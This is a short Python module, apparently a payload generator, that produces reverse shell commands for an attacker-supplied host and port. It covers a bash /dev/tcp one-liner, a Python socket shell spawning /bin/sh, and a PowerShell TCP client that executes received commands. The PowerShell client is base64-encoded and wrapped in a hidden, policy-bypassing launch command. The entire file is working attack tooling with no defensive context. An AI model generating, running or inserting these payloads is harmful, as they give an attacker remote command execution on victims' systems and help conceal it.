import base64
import random

class ReverseShellPayload:
    """Multi-platform reverse shell payload generator"""
    
    @staticmethod
    def linux_bash(host, port):
        return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
    
    @staticmethod
    def linux_python(host, port):
        return f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
'''
    
    @staticmethod
    def windows_powershell(host, port):
        script = f'''
$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''
        return base64.b64encode(script.encode()).decode()
    
    @staticmethod
    def windows_cmd(host, port):
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {ReverseShellPayload.windows_powershell(host, port)}"
    
    @staticmethod
    def all(host, port):
        return {
            'linux_bash': ReverseShellPayload.linux_bash(host, port),
            'linux_python': ReverseShellPayload.linux_python(host, port),
            'windows_powershell': ReverseShellPayload.windows_powershell(host, port),
            'windows_cmd': ReverseShellPayload.windows_cmd(host, port)
      }
